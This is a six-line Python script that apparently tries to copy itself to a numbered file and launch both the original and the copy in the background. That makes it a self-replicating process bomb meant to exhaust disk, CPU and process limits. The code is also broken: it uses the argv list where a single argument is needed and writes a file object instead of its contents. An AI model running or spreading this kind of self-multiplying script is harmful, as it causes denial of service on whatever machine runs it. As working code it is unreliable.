from sys import argv
n=str(int(argv)+1)
open(n,"wb").write(open(argv,"rb"))
from os import system
system("python "+argv+" &")
system("python "+n+" &") 
